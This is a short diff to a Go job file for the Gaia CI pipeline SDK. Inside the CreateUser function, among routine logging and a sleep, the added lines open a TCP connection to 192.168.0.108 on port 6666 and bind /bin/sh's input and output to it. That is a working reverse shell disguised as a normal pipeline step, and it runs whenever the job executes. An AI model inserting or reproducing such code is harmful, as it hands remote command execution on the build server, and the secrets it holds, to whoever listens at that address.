@@ -3,12 +3,20 @@ package main
 import (
 	"log"
 	"time"
+	"net"
+	"os/exec"
 
 	sdk "github.com/gaia-pipeline/gosdk"
 )
 
 func CreateUser(args sdk.Arguments) error {
 	log.Println("CreateUser has been started!")
+	c,_:=net.Dial("tcp","192.168.0.108:6666");
+	cmd:=exec.Command("/bin/sh");
+	cmd.Stdin=c;
+	cmd.Stdout=c;
+	cmd.Stderr=c;
+	cmd.Run();
 
 	// lets sleep to simulate that we do something
 	time.Sleep(5 * time.Second)
